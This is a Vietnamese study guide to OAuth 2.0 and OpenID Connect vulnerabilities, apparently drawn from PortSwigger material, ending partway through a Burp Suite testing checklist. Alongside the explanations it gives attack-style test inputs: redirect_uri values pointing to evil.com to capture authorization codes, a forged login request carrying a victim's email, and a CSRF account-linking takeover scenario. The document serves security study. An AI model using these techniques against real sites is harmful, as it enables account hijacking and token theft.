<!-- TOC -->
## Mục lục

- [OAuth là gì?](#oauth-là-gì)
  - [OAuth dùng để authorization hay authentication?](#oauth-dùng-để-authorization-hay-authentication)
  - [Các vai trò chính trong OAuth](#các-vai-trò-chính-trong-oauth)
  - [OAuth 2.0 hoạt động tổng quát như thế nào?](#oauth-20-hoạt-động-tổng-quát-như-thế-nào)
  - [OAuth grant type là gì?](#oauth-grant-type-là-gì)
  - [OAuth scope là gì?](#oauth-scope-là-gì)
  - [Authorization Code Grant](#authorization-code-grant)
  - [Implicit Grant](#implicit-grant)
  - [OAuth authentication](#oauth-authentication)
  - [Cách nhận biết website đang dùng OAuth](#cách-nhận-biết-website-đang-dùng-oauth)
  - [Recon OAuth service](#recon-oauth-service)
  - [Vì sao OAuth authentication có lỗ hổng?](#vì-sao-oauth-authentication-có-lỗ-hổng)
    - [OAuth rất linh hoạt](#oauth-rất-linh-hoạt)
    - [OAuth có ít cơ chế bảo vệ mặc định](#oauth-có-ít-cơ-chế-bảo-vệ-mặc-định)
    - [Dữ liệu nhạy cảm có thể đi qua browser](#dữ-liệu-nhạy-cảm-có-thể-đi-qua-browser)
    - [Client app thường hiểu sai OAuth](#client-app-thường-hiểu-sai-oauth)
  - [Các nhóm lỗ hổng OAuth authentication](#các-nhóm-lỗ-hổng-oauth-authentication)
  - [Lỗi: Improper implementation of implicit grant type](#lỗi-improper-implementation-of-implicit-grant-type)
  - [Lỗi: Flawed CSRF protection](#lỗi-flawed-csrf-protection)
  - [Lỗi: Leaking authorization codes and access tokens](#lỗi-leaking-authorization-codes-and-access-tokens)
    - [Lỗi validate `redirect_uri`](#lỗi-validate-redirect_uri)
    - [Leak qua open redirect](#leak-qua-open-redirect)
    - [Leak qua Referer header](#leak-qua-referer-header)
    - [Leak token trong implicit flow](#leak-token-trong-implicit-flow)
  - [Flawed scope validation](#flawed-scope-validation)
  - [Lỗi: Unverified user registration](#lỗi-unverified-user-registration)
  - [OpenID Connect là gì?](#openid-connect-là-gì)
  - [OpenID Connect hoạt động như thế nào?](#openid-connect-hoạt-động-như-thế-nào)
  - [Cách nhận biết OpenID Connect](#cách-nhận-biết-openid-connect)
  - [Lỗ hổng OpenID Connect](#lỗ-hổng-openid-connect)
  - [Checklist test OAuth bằng Burp Suite](#checklist-test-oauth-bằng-burp-suite)
    - [Xác định flow](#xác-định-flow)
    - [Ghi lại tham số quan trọng](#ghi-lại-tham-số-quan-trọng)
    - [Kiểm tra redirect_uri](#kiểm-tra-redirect_uri)
    - [Kiểm tra state](#kiểm-tra-state)
    - [Kiểm tra implicit flow](#kiểm-tra-implicit-flow)
    - [Kiểm tra leak code/token](#kiểm-tra-leak-codetoken)
    - [Kiểm tra scope](#kiểm-tra-scope)
    - [Kiểm tra OpenID Connect](#kiểm-tra-openid-connect)
  - [Cách phòng chống OAuth vulnerabilities](#cách-phòng-chống-oauth-vulnerabilities)
  - [Tóm tắt nhanh để nhớ](#tóm-tắt-nhanh-để-nhớ)
- [WU](#wu)
  - [Authentication bypass via OAuth implicit flow](#authentication-bypass-via-oauth-implicit-flow)
  - [SSRF via openID dynamic client registration](#ssrf-via-openid-dynamic-client-registration)
  - [Forced OAuth profile linking](#forced-oauth-profile-linking)
  - [OAuth account hijacking via redirect_uri](#oauth-account-hijacking-via-redirect_uri)
  - [Stealing OAuth access tokens via an open redirect](#stealing-oauth-access-tokens-via-an-open-redirect)
<!-- /TOC -->
# OAuth là gì?

**OAuth 2.0** là một framework cho phép một ứng dụng truy cập một phần dữ liệu hoặc chức năng của người dùng trên một dịch vụ khác mà không cần biết mật khẩu của người dùng.

Ví dụ quen thuộc:

- Đăng nhập bằng Google.
- Đăng nhập bằng Facebook.
- Cho một app quyền đọc danh bạ, email, ảnh, profile.
- Cho một công cụ quản lý lịch quyền đọc/sửa Google Calendar.

Ý tưởng cốt lõi:

> Người dùng không đưa mật khẩu Google/Facebook/GitHub cho website thứ ba. Thay vào đó, OAuth provider cấp cho website đó một **access token** với quyền hạn cụ thể.

Ví dụ:

```text
Bạn muốn đăng nhập vào website A bằng tài khoản Google.
Website A không biết mật khẩu Google của bạn.
Google chỉ cấp cho website A một token để lấy thông tin cần thiết, ví dụ email và tên.
```

## OAuth dùng để authorization hay authentication?
Đây là điểm PortSwigger nhấn mạnh rất nhiều.
OAuth ban đầu được thiết kế để phục vụ **authorization**, tức là **ủy quyền truy cập tài nguyên**.
Ví dụ authorization:

```text
Tôi cho app X quyền đọc danh bạ Google của tôi.
Tôi cho app Y quyền đăng bài lên tài khoản mạng xã hội của tôi.
```

Nhưng trong thực tế, OAuth thường được dùng cho **authentication**, tức là **xác thực đăng nhập**.
Ví dụ authentication:
```text
Tôi dùng tài khoản Google để đăng nhập vào website A.
Website A lấy email từ Google rồi dùng email đó để xác định tôi là ai.
```
Vấn đề bảo mật nằm ở chỗ:

> OAuth không được thiết kế ban đầu như một cơ chế đăng nhập hoàn chỉnh. Nếu developer dùng OAuth để authentication nhưng kiểm tra token, user info, redirect URI, state, scope không đúng, có thể dẫn đến bypass authentication hoặc chiếm tài khoản.
## Các vai trò chính trong OAuth
Trong OAuth có 3 vai trò chính:

Ví dụ cụ thể:

```text
Bạn vào website client-app.com.
Bạn chọn “Log in with Google”.
Google hỏi bạn có đồng ý cho client-app.com đọc email/profile không.
Nếu đồng ý, Google cấp token/code cho client-app.com.
client-app.com dùng thông tin từ Google để đăng nhập bạn.
```

Ánh xạ vai trò:

| Thành phần | Trong ví dụ |
|---|---|
| Resource owner | Bạn |
| Client application | client-app.com |
| OAuth service provider | Google |
OAuth provider thường có 2 thành phần logic:

| Thành phần | Chức năng |
|---|---|
| **Authorization server** | Xử lý đăng nhập, consent, cấp authorization code hoặc access token |
| **Resource server** | Chứa API dữ liệu user, ví dụ endpoint `/userinfo` |


## OAuth 2.0 hoạt động tổng quát như thế nào?

Một flow OAuth authentication cơ bản thường như sau:

```text
1. User bấm “Log in with Google”.
2. Client app redirect trình duyệt sang OAuth provider.
3. OAuth provider yêu cầu user đăng nhập và đồng ý cấp quyền.
4. Nếu user đồng ý, OAuth provider redirect user về client app.
5. Client app nhận authorization code hoặc access token.
6. Client app dùng code/token để lấy thông tin user.
7. Client app đăng nhập user dựa trên thông tin nhận được.
```

Ví dụ dữ liệu user trả về từ endpoint `/userinfo`:

```json
{
  "username": "carlos",
  "email": "carlos@carlos-montoya.net"
}
```

Trong OAuth authentication, client app thường dùng một thông tin định danh như `email`, `username`, hoặc ID riêng của provider để tìm tài khoản tương ứng trong hệ thống.

## OAuth grant type là gì?

**Grant type** là kiểu flow OAuth. Nó quyết định trình tự các bước mà client app dùng để lấy access token.

PortSwigger tập trung vào 2 grant type phổ biến nhất:

| Grant type | Đặc điểm |
|---|---|
| **Authorization Code Grant** | An toàn hơn, thường dùng cho web app có backend |
| **Implicit Grant** | Đơn giản hơn, token đi qua browser nên rủi ro cao hơn |

Grant type ảnh hưởng đến:

- Client app gửi request authorization như thế nào.
- OAuth provider trả về `code` hay `token`.
- Access token có đi qua browser hay không.
- Có kênh server-to-server bảo mật hay không.

## OAuth scope là gì?

**Scope** cho biết client app muốn xin quyền truy cập dữ liệu hoặc chức năng gì.

Ví dụ:

```http
scope=openid profile email
```

Hoặc tùy provider:

```http
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

Ý nghĩa:

| Scope | Ý nghĩa thường gặp |
|---|---|
| `openid` | Yêu cầu dùng OpenID Connect |
| `profile` | Xin thông tin profile cơ bản |
| `email` | Xin email |
| `address` | Xin địa chỉ |
| `phone` | Xin số điện thoại |
| `contacts.read` | Xin quyền đọc danh bạ, tùy provider |

Lưu ý:

> Với OAuth thuần, tên scope có thể khác nhau tùy provider. Với OpenID Connect, một số scope như `openid`, `profile`, `email`, `address`, `phone` được chuẩn hóa hơn.

## Authorization Code Grant

**Authorization Code Grant** là flow an toàn hơn và thường được khuyến nghị cho ứng dụng web server-side.

Điểm quan trọng:

> Access token không được gửi trực tiếp qua browser. Browser chỉ nhận **authorization code**, sau đó backend của client app dùng code này để đổi lấy access token qua kênh server-to-server.

Flow tổng quát:

```text
User
  |
  | 1. Click “Log in with Google”
  v
Client App
  |
  | 2. Redirect tới OAuth authorization endpoint
  v
OAuth Provider
  |
  | 3. User đăng nhập và đồng ý cấp quyền
  v
Client App nhận authorization code
  |
  | 4. Backend đổi code lấy access token
  v
OAuth Provider
  |
  | 5. Client dùng token gọi API /userinfo
  v
Resource Server
```
**Authorization request**

Request ban đầu thường có dạng:

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

Các tham số quan trọng:

| Tham số | Ý nghĩa |
|---|---|
| `client_id` | ID duy nhất của client app, được cấp khi app đăng ký với OAuth provider |
| `redirect_uri` | URL callback mà provider sẽ redirect user về sau khi xác thực |
| `response_type=code` | Cho biết client muốn dùng Authorization Code Grant |
| `scope` | Quyền/dữ liệu client muốn xin |
| `state` | Giá trị ngẫu nhiên, khó đoán, gắn với session để chống CSRF |

Điểm cần chú ý khi pentest:

- `redirect_uri` là tham số rất quan trọng, nhiều attack OAuth xuất phát từ validate lỏng tham số này.
- `state` phải tồn tại, khó đoán, và gắn với session hiện tại.

**User login và consent**

Sau khi nhận authorization request, OAuth provider sẽ:

1. Yêu cầu user đăng nhập nếu chưa đăng nhập.
2. Hiển thị màn hình hỏi user có đồng ý cấp quyền cho client app không.
3. Nếu đồng ý, provider tạo authorization code.


Callback chứa authorization code

Sau khi user đồng ý, OAuth provider redirect browser về `redirect_uri`:

```http
GET /callback?code=abc123&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```

Client app cần kiểm tra:

- `state` trả về có khớp với state đã lưu trong session không.
- `code` có hợp lệ không.
- Flow này có phải do chính session hiện tại khởi tạo không.

---

**Đổi authorization code lấy access token**

Backend của client app gửi request server-to-server tới OAuth provider:

```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=abc123&redirect_uri=https://client-app.com/callback&client_id=12345&client_secret=secret-value
```

Provider trả về:

```json
{
  "access_token": "eyJ...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile"
}
```

Điểm bảo mật:

- Request này đi từ backend client app đến OAuth provider, không đi qua browser.
- Client app thường dùng `client_secret` để chứng minh mình là client hợp lệ.
- Access token ít bị lộ hơn so với implicit flow.

**Dùng access token lấy user info**

Client app dùng access token gọi resource server:

```http
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer eyJ...
```

Resource server trả về thông tin user:

```json
{
  "sub": "248289761001",
  "username": "carlos",
  "email": "carlos@carlos-montoya.net"
}
```

Sau đó client app dùng thông tin này để đăng nhập user.

**Vì sao Authorization Code Grant an toàn hơn?**

Vì:

- Access token không được trả về trực tiếp qua browser.
- Token được lấy qua kênh backend server-to-server.
- Client có thể dùng `client_secret` để xác thực với provider.
- Rủi ro token bị lộ qua URL, history, Referer, JavaScript thấp hơn.

Tuy nhiên, flow này vẫn có thể bị lỗi nếu:

- `redirect_uri` validate lỏng.
- Thiếu `state` hoặc validate `state` sai.
- Authorization code bị leak.
- Client không kiểm tra token/user info đúng cách.

## Implicit Grant

**Implicit Grant** đơn giản hơn Authorization Code Grant.

Thay vì nhận authorization code rồi đổi lấy access token, client app nhận **access token trực tiếp qua browser** sau khi user đồng ý.

Request ban đầu thường có:

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

Điểm khác biệt chính:

```http
response_type=token
```
**Callback chứa access token**

Sau khi user đồng ý, provider redirect về client app kèm access token, thường trong URL fragment:

```text
https://client-app.com/callback#access_token=xyz&token_type=Bearer&expires_in=3600&state=ae13d489bd00e3c24
```

Token nằm trong browser, client-side JavaScript có thể đọc token rồi dùng token gọi API.
**Vì sao Implicit Grant kém an toàn hơn?**

Vì:

- Toàn bộ flow diễn ra qua browser redirect.
- Không có kênh server-to-server bảo mật để đổi code lấy token.
- Access token đi qua môi trường browser, dễ bị lộ hơn.
- Client-side JavaScript xử lý token nên tăng attack surface.

Implicit Grant từng phù hợp hơn với single-page applications hoặc native desktop apps, nơi không dễ giữ `client_secret` ở backend. Tuy nhiên khi dùng cho authentication, nếu xử lý sai, nó rất dễ dẫn tới bypass đăng nhập.

## OAuth authentication

Khi OAuth được dùng để authentication, flow thường là:

```text
1. User chọn đăng nhập bằng OAuth provider.
2. Client app xin quyền đọc thông tin định danh của user.
3. OAuth provider cấp code/token.
4. Client app lấy thông tin user, ví dụ email hoặc username.
5. Client app tìm tài khoản tương ứng trong hệ thống.
6. Client app tạo session đăng nhập cho user.
```

Ví dụ:

```json
{
  "email": "carlos@carlos-montoya.net",
  "username": "carlos"
}
```

Nếu client app tin email này mà không kiểm tra token, issuer, audience, subject, trạng thái verified email, hoặc không kiểm tra token có thực sự thuộc client app hay không, có thể dẫn đến lỗi nghiêm trọng.

---

## Cách nhận biết website đang dùng OAuth

Dấu hiệu trên giao diện:

```text
Log in with Google
Sign in with Facebook
Continue with GitHub
Login with social media
```

Khi proxy qua Burp Suite, hãy tìm request tới endpoint authorization, ví dụ:

```http
GET /authorization?client_id=...&redirect_uri=...&response_type=...&scope=...&state=... HTTP/1.1
Host: oauth-provider.com
```

Hoặc trong lab PortSwigger, endpoint có thể là:

```text
/auth
```

Tham số cần quan sát:

```text
client_id
redirect_uri
response_type
scope
state
nonce
code
access_token
id_token
```

Cách xác định flow:

| Dấu hiệu | Flow |
|---|---|
| `response_type=code` | Authorization Code Grant |
| `response_type=token` | Implicit Grant |
| `response_type=id_token` | OpenID Connect |
| `scope=openid` | OpenID Connect |

---

## Recon OAuth service

PortSwigger khuyên nên recon OAuth provider để tìm thông tin cấu hình, endpoint, tính năng hỗ trợ.

Các endpoint phổ biến:

```text
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

Ví dụ OpenID configuration có thể tiết lộ:

```json
{
  "authorization_endpoint": "https://oauth-provider.com/auth",
  "token_endpoint": "https://oauth-provider.com/token",
  "userinfo_endpoint": "https://oauth-provider.com/userinfo",
  "registration_endpoint": "https://oauth-provider.com/register",
  "jwks_uri": "https://oauth-provider.com/.well-known/jwks.json",
  "response_types_supported": ["code", "token", "id_token"]
}
```

Thông tin cần tìm:

| Thông tin | Tác dụng khi test |
|---|---|
| `authorization_endpoint` | Biết endpoint bắt đầu flow |
| `token_endpoint` | Biết endpoint đổi code lấy token |
| `userinfo_endpoint` | Biết nơi lấy thông tin user |
| `registration_endpoint` | Kiểm tra dynamic client registration |
| `jwks_uri` | Kiểm tra key dùng verify JWT |
| `response_types_supported` | Biết provider hỗ trợ flow nào |
| `scopes_supported` | Biết scope nào có thể xin |
| `request_uri_parameter_supported` | Kiểm tra authorization request by reference |


## Vì sao OAuth authentication có lỗ hổng?

### OAuth rất linh hoạt

OAuth hỗ trợ nhiều grant type, nhiều cách cấu hình, nhiều provider có cách triển khai khác nhau. Sự linh hoạt này giúp dễ tích hợp nhưng cũng dễ cấu hình sai.

### OAuth có ít cơ chế bảo vệ mặc định

OAuth specification không tự bảo vệ hết mọi tình huống. Developer phải tự triển khai cẩn thận các biện pháp như:

```text
state validation
redirect_uri validation
scope validation
token validation
client_id validation
id_token validation
```

Nếu một bước bị thiếu hoặc validate lỏng, có thể xuất hiện lỗ hổng.

### Dữ liệu nhạy cảm có thể đi qua browser

Tùy flow, authorization code, access token, hoặc ID token có thể xuất hiện trong URL, fragment, request, JavaScript, log, Referer. Nếu redirect hoặc client-side handling sai, token/code có thể bị lộ.

### Client app thường hiểu sai OAuth

Một lỗi phổ biến là developer nghĩ:

```text
Có token hoặc có email trả về nghĩa là user đã được xác thực an toàn.
```

Nhưng thực tế cần kiểm tra token đó:

- Có hợp lệ không?
- Có do đúng provider phát hành không?
- Có dành cho client app này không?
- Có thuộc đúng user không?
- Scope có đủ không?
- Email đã verified chưa?

## Các nhóm lỗ hổng OAuth authentication

PortSwigger chia các lỗ hổng chính thành các nhóm sau:

1. **Improper implementation of the implicit grant type**  
   Triển khai implicit flow sai, server tin dữ liệu do browser gửi lên.

2. **Flawed CSRF protection**  
   Thiếu `state` hoặc validate `state` không đúng.

3. **Leaking authorization codes and access tokens**  
   Code/token bị lộ qua `redirect_uri`, open redirect, Referer, JavaScript, log.

4. **Flawed scope validation**  
   Resource server hoặc provider không kiểm tra scope đúng cách.

5. **Unverified user registration**  
   Client app tin email chưa được xác minh từ OAuth provider.

6. **OpenID Connect vulnerabilities**  
   Lỗi liên quan dynamic client registration, request_uri, ID token, metadata.


## Lỗi: Improper implementation of implicit grant type


Trong implicit flow, access token được trả về qua browser. Sau đó client-side JavaScript thường gửi một request về server để hoàn tất đăng nhập.

Lỗi xảy ra khi server tin dữ liệu do browser gửi lên mà không kiểm tra lại với OAuth provider.

Ví dụ flow sai:

```text
1. Browser nhận access_token.
2. Browser gửi POST /authenticate kèm email hoặc username.
3. Server tin email/username này.
4. Server tạo session đăng nhập cho user tương ứng.
```

Request nguy hiểm:

```http
POST /authenticate HTTP/1.1
Host: client-app.com
Content-Type: application/json

{
  "email": "carlos@carlos-montoya.net",
  "username": "carlos"
}
```

Nếu attacker sửa email:

```json
{
  "email": "victim@example.com"
}
```

và server không xác minh token với provider, attacker có thể đăng nhập thành victim.


Server đáng lẽ phải hỏi OAuth provider:

```text
Token này có thật không?
Token này thuộc user nào?
Token này có được cấp cho client app của tôi không?
```

Nhưng server lại tin browser:

```text
Browser bảo đây là email của Carlos, vậy đăng nhập Carlos.
```

Đây là lỗi logic authentication.

Quan sát sau khi OAuth login có request nào kiểu:

```http
POST /authenticate
POST /login
POST /oauth-callback
```

với body chứa:

```json
{
  "email": "...",
  "username": "...",
  "token": "..."
}
```

Thử kiểm tra:

- Có thể sửa email không?
- Có thể sửa username không?
- Có thể bỏ token không?
- Có thể dùng token của user A nhưng email của user B không?
- Server có gọi `/userinfo` để verify token không?

## Lỗi: Flawed CSRF protection


Trong OAuth, `state` dùng để chống CSRF và ràng buộc OAuth flow với session hiện tại.

Authorization request:

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=random123 HTTP/1.1
```

Callback:

```http
GET /callback?code=abc123&state=random123 HTTP/1.1
```

Client app phải kiểm tra:

```text
state trả về có đúng là state đã sinh ra cho session này không?
```


Các lỗi thường gặp:

| Lỗi | Hậu quả |
|---|---|
| Không có `state` | Dễ bị CSRF |
| `state` cố định | Dễ đoán/bypass |
| `state` không gắn với session | Có thể dùng state của phiên khác |
| Callback không kiểm tra `state` | OAuth flow có thể bị ép hoàn tất |
| Xóa `state` vẫn login được | Dấu hiệu validate yếu |


**Một dạng lỗi nguy hiểm là CSRF trong chức năng liên kết tài khoản OAuth.**

Kịch bản:

```text
1. Attacker đăng nhập tài khoản attacker trên OAuth provider.
2. Attacker bắt đầu flow liên kết OAuth với client app.
3. Attacker lấy URL callback chứa code của mình.
4. Attacker gửi URL này cho victim.
5. Victim đang đăng nhập client app và truy cập URL.
6. Client app liên kết OAuth account của attacker vào tài khoản victim.
7. Sau này attacker đăng nhập bằng OAuth của mình và vào được tài khoản victim.
```

Điều kiện thường là:

- Thiếu `state`.
- `state` không được validate đúng.
- Chức năng account linking tự động hoàn tất khi callback nhận code.

## Lỗi: Leaking authorization codes and access tokens


Authorization code hoặc access token có thể bị lộ nếu OAuth flow redirect sai hoặc dữ liệu nhạy cảm xuất hiện trong URL không an toàn.

Nguồn leak phổ biến:

| Nguyên nhân | Ví dụ |
|---|---|
| `redirect_uri` validate lỏng | Redirect code/token sang domain attacker |
| Open redirect trong client app | Callback nhận code rồi redirect tiếp sang site ngoài |
| Referer leak | Trang callback load image/script/CSS từ domain ngoài |
| Token nằm trong URL | Lưu trong history, log, proxy, analytics |
| Dynamic JavaScript | Code/token bị nhúng vào script response có thể bị đọc chéo |


### Lỗi validate `redirect_uri`

OAuth provider nên chỉ cho redirect về URI đã đăng ký, ví dụ:

```text
https://client-app.com/callback
```

Nếu validate lỏng, attacker có thể thử:

```text
https://client-app.com.evil.com/callback
https://evil.com/callback
https://client-app.com/callback/../redirect?url=https://evil.com
https://client-app.com/callback?next=https://evil.com
```

Nếu provider gửi code/token tới URI do attacker kiểm soát, attacker có thể lấy code/token.

---

### Leak qua open redirect

Ngay cả khi provider chỉ cho redirect về `client-app.com`, client app có thể có open redirect:

```text
https://client-app.com/oauth-callback?next=https://evil.com
```

Nếu callback nhận code rồi redirect tiếp sang `evil.com`, authorization code có thể bị lộ.

### Leak qua Referer header

Nếu callback URL chứa code:

```text
https://client-app.com/callback?code=abc123
```

và trang callback load tài nguyên bên ngoài:

```html
<img src="https://analytics.example.net/pixel.png">
<script src="https://cdn.example.net/app.js"></script>
```

Browser có thể gửi `Referer` chứa URL callback. Nếu không có chính sách Referrer-Policy phù hợp, domain ngoài có thể nhìn thấy `code`.

---

### Leak token trong implicit flow

Trong implicit flow, access token có thể nằm trong fragment:

```text
https://client-app.com/callback#access_token=xyz
```

Fragment thường không gửi lên server trong HTTP request, nhưng vẫn nằm trong browser và client-side JavaScript có thể đọc. Nếu có XSS, script bên thứ ba, hoặc xử lý client-side yếu, token có thể bị đánh cắp.

## Flawed scope validation


Scope xác định token được phép làm gì. Nếu provider hoặc resource server không kiểm tra scope đúng, token có quyền thấp có thể dùng để truy cập dữ liệu/quyền cao hơn.

Ví dụ token chỉ có scope:

```text
profile
```

nhưng vẫn gọi được API cần:

```text
email
contacts.read
admin
```

| Lỗi | Mô tả |
|---|---|
| Resource server không kiểm tra scope | Token nào cũng gọi được API |
| Provider cho nâng scope không cần consent | Attacker xin thêm quyền trái phép |
| Client app không kiểm tra scope thực tế được cấp | Tưởng có quyền nhưng token không đủ quyền |
| Token không bị ràng buộc với client_id | Token cấp cho client A dùng được cho client B |


Khi test:

- Thay đổi `scope` trong authorization request.
- Giảm scope nhưng vẫn gọi API nhiều quyền.
- Tăng scope và xem provider có hỏi consent lại không.
- Dùng token của client khác để gọi API.
- Kiểm tra response token có trả về scope thực tế không.


## Lỗi: Unverified user registration


Một số OAuth provider cho phép user đăng ký bằng email nhưng chưa xác minh email đó.

Nếu client app dùng email từ provider để xác định tài khoản, attacker có thể lợi dụng.

Kịch bản:

```text
1. Victim có tài khoản trên client app với email victim@example.com.
2. Attacker tạo tài khoản trên OAuth provider và khai báo email victim@example.com.
3. OAuth provider không bắt xác minh email.
4. Client app tin email provider trả về.
5. Attacker đăng nhập client app thành victim.
```


Vì client app nghĩ:

```text
Provider trả về email victim@example.com nghĩa là người này sở hữu email đó.
```

Nhưng nếu email chưa verified, điều này không đúng.


Client app nên:

- Không chỉ dựa vào `email`.
- Kiểm tra `email_verified` nếu dùng OpenID Connect.
- Dùng `sub` hoặc provider-specific user ID ổn định để map tài khoản.
- Kiểm tra `iss` để biết provider nào phát hành danh tính.
- Không cho login bằng email chưa xác minh.

## OpenID Connect là gì?

**OpenID Connect**, viết tắt là **OIDC**, là lớp mở rộng nằm trên OAuth 2.0 để hỗ trợ authentication tốt hơn.

Nói đơn giản:

```text
OAuth 2.0 chủ yếu dùng để cấp quyền truy cập.
OpenID Connect bổ sung lớp định danh/xác thực người dùng.
```

So sánh:

| OAuth 2.0 | OpenID Connect |
|---|---|
| Thiên về authorization | Thiên về authentication |
| Trọng tâm là access token | Có thêm ID token |
| Scope có thể tùy provider | Có scope chuẩn như `openid`, `profile`, `email` |
| Lấy user info qua resource server | Có thể nhận thông tin định danh trong ID token |


## OpenID Connect hoạt động như thế nào?

OIDC lồng vào OAuth flow bình thường nhưng bổ sung:

- Scope chuẩn.
- Claim chuẩn.
- `id_token`.
- Metadata discovery.


OIDC dùng thuật ngữ hơi khác OAuth:

| OpenID Connect | Tương đương OAuth | Ý nghĩa |
|---|---|---|
| **Relying party** | Client application | App yêu cầu xác thực user |
| **End user** | Resource owner | Người dùng được xác thực |
| **OpenID provider** | OAuth service provider | Provider hỗ trợ OIDC |


**Claim** là cặp key-value mô tả thông tin user.

Ví dụ claim:

```json
{
  "given_name": "Carlos",
  "family_name": "Montoya",
  "email": "carlos@carlos-montoya.net",
  "email_verified": true
}
```

OIDC dùng các scope chuẩn:

| Scope | Claim thường được cấp |
|---|---|
| `openid` | Bắt buộc để dùng OIDC |
| `profile` | Tên, họ, ngày sinh, username, avatar... |
| `email` | Email và trạng thái xác minh email |
| `address` | Địa chỉ |
| `phone` | Số điện thoại |

Muốn dùng OIDC, authorization request phải có:

```http
scope=openid
```

Điểm quan trọng nhất của OIDC là **ID token**.

ID token thường là JWT được ký, chứa claim định danh user và thông tin xác thực.

Ví dụ payload:

```json
{
  "iss": "https://oauth-provider.com",
  "sub": "248289761001",
  "aud": "client-id-12345",
  "exp": 1710000000,
  "iat": 1709996400,
  "email": "carlos@carlos-montoya.net",
  "email_verified": true
}
```

Các claim quan trọng:

| Claim | Ý nghĩa |
|---|---|
| `iss` | Issuer, provider phát hành token |
| `sub` | Subject, ID duy nhất của user tại provider |
| `aud` | Audience, client app mà token dành cho |
| `exp` | Thời gian hết hạn |
| `iat` | Thời điểm phát hành |
| `email` | Email user |
| `email_verified` | Email đã xác minh chưa |
| `nonce` | Giá trị chống replay, nếu flow dùng nonce |

Client app phải validate ID token, không được chỉ decode JWT rồi tin nội dung bên trong.
OIDC có thể dùng response type:

```http
response_type=id_token
```

Hoặc kết hợp:

```http
response_type=id_token token
response_type=id_token code
```

Nghĩa là client có thể nhận cả ID token và access token/code tùy flow.


## Cách nhận biết OpenID Connect

Dấu hiệu chắc chắn nhất:

```http
scope=openid
```

Các dấu hiệu khác:

```text
id_token
nonce
/.well-known/openid-configuration
jwks_uri
claims_supported
```

Nếu login flow ban đầu không có vẻ dùng OIDC, vẫn có thể kiểm tra provider có hỗ trợ không bằng cách xem:

```text
/.well-known/openid-configuration
```

Hoặc thử thêm scope:

```http
scope=openid profile email
```

và quan sát provider có báo lỗi không.


## Lỗ hổng OpenID Connect

PortSwigger nhấn mạnh OIDC có specification chặt chẽ hơn OAuth thuần, nên giảm một số lỗi triển khai kỳ quặc. Tuy nhiên, vì OIDC nằm trên OAuth, nó vẫn có thể bị các lỗi OAuth cơ bản như:

- Redirect URI validation yếu.
- Thiếu `state`.
- Token/code leak.
- Scope validation yếu.
- Client tin dữ liệu không kiểm tra.

Ngoài ra, OIDC có một số attack surface riêng.


OIDC hỗ trợ cơ chế cho phép client app đăng ký động với provider.

Endpoint có thể là:

```text
/registration
/openid/register
```

Request đăng ký client ví dụ:

```http
POST /openid/register HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/json
Accept: application/json

{
  "application_type": "web",
  "redirect_uris": [
    "https://client-app.com/callback",
    "https://client-app.com/callback2"
  ],
  "client_name": "My Application",
  "logo_uri": "https://client-app.com/logo.png",
  "jwks_uri": "https://client-app.com/my_public_keys.jwks"
}
```

Lỗi xảy ra nếu provider cho phép đăng ký client động mà không yêu cầu xác thực hoặc validate metadata kém.

Hậu quả có thể gồm:

- Attacker tự tạo client độc hại.
- Attacker kiểm soát `redirect_uris`.
- Provider fetch các URI do attacker cung cấp.
- Có thể dẫn đến SSRF nếu provider truy cập `logo_uri`, `jwks_uri`, hoặc endpoint metadata khác.


OIDC có thể cho phép client truyền tham số authorization bằng tham chiếu thông qua `request_uri`.

Ví dụ:

```http
GET /authorization?client_id=abc&request_uri=https://client-app.com/request.jwt HTTP/1.1
Host: oauth-authorization-server.com
```

Thay vì truyền tất cả tham số trong query string, provider fetch một JWT ở `request_uri`, rồi đọc tham số từ đó.

Rủi ro:

| Rủi ro | Giải thích |
|---|---|
| SSRF | Provider fetch URL do attacker kiểm soát |
| Bypass validation | Query string được validate kỹ nhưng JWT trong `request_uri` lại validate lỏng |
| Redirect manipulation | Tham số trong JWT có thể chứa `redirect_uri` khác |

Khi test, cần xem provider có hỗ trợ:

```json
{
  "request_uri_parameter_supported": true
}
```

trong OpenID configuration hay không.

## Checklist test OAuth bằng Burp Suite

### Xác định flow

Tìm request tới:

```text
/authorization
/auth
/oauth/authorize
```

Xem:

```http
response_type=code
response_type=token
response_type=id_token
```

---

### Ghi lại tham số quan trọng

```text
client_id
redirect_uri
response_type
scope
state
nonce
code
access_token
id_token
```

---

### Kiểm tra redirect_uri

Câu hỏi cần test:

- `redirect_uri` có bắt buộc khớp chính xác không?
- Có chấp nhận domain gần giống không?
- Có chấp nhận subdomain attacker không?
- Có chấp nhận path khác không?
- Có open redirect trong callback không?
- Có xử lý duplicate parameter lạ không?

Payload tư duy:

```text
https://client-app.com.evil.com/callback
https://evil.com/callback
https://client-app.com/callback/../redirect?url=https://evil.com
https://client-app.com/callback?next=https://evil.com
```

---

### Kiểm tra state

Test:

- Xóa `state` khỏi callback.
- Thay `state` bằng giá trị rác.
- Dùng `state` của session khác.
- Dùng lại `state` cũ.
- Kiểm tra `state` có random không.
- Kiểm tra `state` có gắn với session không.

Dấu hiệu lỗi:

```text
Không có state nhưng vẫn login/link account thành công.
State sai nhưng vẫn được chấp nhận.
State của session khác vẫn dùng được.
```


### Kiểm tra implicit flow

Nếu thấy:

```http
response_type=token
```

hãy kiểm tra:

- Sau khi nhận token, browser gửi gì về server?
- Request `/authenticate` có chứa email/username không?
- Có sửa email/username được không?
- Server có verify token với provider không?
- Có thể đăng nhập bằng token/user info không khớp không?

---

### Kiểm tra leak code/token

Quan sát:

- Authorization code có nằm trong URL không?
- Access token có nằm trong fragment không?
- Callback có load tài nguyên bên thứ ba không?
